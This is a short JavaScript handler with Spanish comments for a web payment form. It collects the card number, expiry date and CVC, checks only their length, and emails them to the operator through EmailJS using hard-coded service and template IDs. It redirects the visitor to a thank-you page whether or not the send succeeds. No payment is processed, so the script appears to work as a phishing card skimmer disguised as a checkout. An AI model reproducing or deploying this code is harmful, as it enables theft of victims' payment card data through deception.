// Inicializa EmailJS con tu Public Key
(function() {
    emailjs.init('ReqtkWfjI392LAzFb'); // Public Key
})();

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Evita que el formulario se envíe de forma tradicional

    // Recopila los datos del formulario
    const cardData = {
        numero: this.querySelector('input[type="text"]').value, // Número de tarjeta
        fecha: this.querySelector('input[type="month"]').value, // Fecha de expiración
        cvc: this.querySelector('input[type="text"]:last-child').value // CVC
    };

    // Validaciones
    if (cardData.numero.length !== 16 || !/^\d+$/.test(cardData.numero)) {
        alert('El número de tarjeta debe tener 16 dígitos.');
        return;
    }

    if (cardData.cvc.length !== 3 || !/^\d+$/.test(cardData.cvc)) {
        alert('El código CVC debe tener 3 dígitos.');
        return;
    }

    // Envía los datos a tu correo usando EmailJS
    emailjs.send("service_syrc1uk", "template_u3etoro", cardData) // Service ID y Template ID
        .then(() => {
            // Redirige a la página de agradecimiento
            window.location.href = "thank-you.html";
        })
        .catch(error => {
            console.error('Error al enviar el correo:', error); // Imprime el error en la consola
            // Redirige a la página de agradecimiento incluso si hay un error
            window.location.href = "thank-you.html";
        });
});
